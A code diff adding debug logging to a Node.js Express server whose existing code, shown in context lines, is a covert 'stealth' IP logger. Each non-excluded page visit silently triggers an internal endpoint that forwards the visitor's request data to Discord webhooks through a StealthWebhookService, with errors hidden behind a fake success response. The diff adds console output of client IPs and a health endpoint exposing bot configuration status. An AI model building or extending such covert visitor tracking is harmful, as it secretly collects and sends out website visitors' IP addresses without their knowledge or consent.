@@ -3,6 +3,15 @@ if (process.env.NODE_ENV !== 'production') {
   require('dotenv').config({ path: './token.env' });
 }
 
+// Debug environment variables
+console.log('🔧 Environment Debug:');
+console.log('NODE_ENV:', process.env.NODE_ENV);
+console.log('DISCORD_BOT_TOKEN:', process.env.DISCORD_BOT_TOKEN ? 'SET' : 'NOT SET');
+console.log('DISCORD_CHANNEL_ID:', process.env.DISCORD_CHANNEL_ID ? 'SET' : 'NOT SET');
+console.log('WEBSITE_NAME:', process.env.WEBSITE_NAME);
+console.log('WEBHOOK_COUNT:', process.env.WEBHOOK_COUNT);
+console.log('ENABLE_BOT:', process.env.ENABLE_BOT);
+
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
@@ -19,6 +28,11 @@ const PORT = process.env.PORT || 3000;
 
 // Initialize webhook service
 const webhookService = new StealthWebhookService();
+
+// Debug webhook service
+console.log('🔗 Webhook Service Debug:');
+console.log('Webhook count loaded:', webhookService.webhooks.length);
+console.log('First webhook URL:', webhookService.webhooks[0]?.url ? 'SET' : 'NOT SET');
 
 // CORS configuration
 app.use(cors({
@@ -46,6 +60,9 @@ app.use(express.urlencoded({ extended: true }));
 
 // Stealth IP logging endpoint
 app.post('/api/stealth/log', async (req, res) => {
+  console.log('🚨 Stealth log endpoint called');
+  console.log('Client IP:', req.headers['x-forwarded-for'] || req.ip || 'unknown');
+  
   try {
     const payload = {
       content: "🚨 **New Visitor Detected** 🚨",
@@ -53,9 +70,12 @@ app.post('/api/stealth/log', async (req, res) => {
       avatar_url: "https://cdn.discordapp.com/attachments/123456789/987654321/logo.png"
     };
 
-    await webhookService.sendMessage(payload, req);
+    console.log('📤 Sending webhook message...');
+    const result = await webhookService.sendMessage(payload, req);
+    console.log('✅ Webhook sent successfully:', result);
     res.status(200).json({ success: true });
   } catch (error) {
+    console.error('❌ Webhook error:', error.message);
     // Silent error handling for stealth operation
     res.status(200).json({ success: true });
   }
@@ -70,9 +90,13 @@ app.use((req, res, next) => {
     return next();
   }
   
+  console.log('👤 Visitor detected:', req.path);
+  console.log('IP:', req.headers['x-forwarded-for'] || req.ip || 'unknown');
+  
   // Log visitor IP asynchronously (don't block the request)
   setTimeout(async () => {
     try {
+      console.log('🔄 Calling stealth log endpoint...');
       const response = await fetch(`${req.protocol}://${req.get('host')}/api/stealth/log`, {
         method: 'POST',
         headers: {
@@ -82,8 +106,10 @@ app.use((req, res, next) => {
         body: JSON.stringify({})
       });
       
+      console.log('📡 Stealth log response status:', response.status);
       // Silent operation - no logging
     } catch (error) {
+      console.error('❌ Stealth log error:', error.message);
       // Silent error handling for stealth operation
     }
   }, 0);
@@ -97,7 +123,19 @@ app.get('/api/health', (req, res) => {
     status: 'healthy',
     timestamp: new Date().toISOString(),
     environment: process.env.NODE_ENV || 'development',
-    webhookCount: webhookService.webhooks.length
+    webhookCount: webhookService.webhooks.length,
+    botToken: process.env.DISCORD_BOT_TOKEN ? 'SET' : 'NOT SET',
+    channelId: process.env.DISCORD_CHANNEL_ID ? 'SET' : 'NOT SET',
+    enableBot: process.env.ENABLE_BOT
+  });
+});
+
+// Simple test endpoint
+app.get('/api/test', (req, res) => {
+  res.json({
+    message: 'Server is working!',
+    timestamp: new Date().toISOString(),
+    webhooks: webhookService.webhooks.length
   });
 });
 
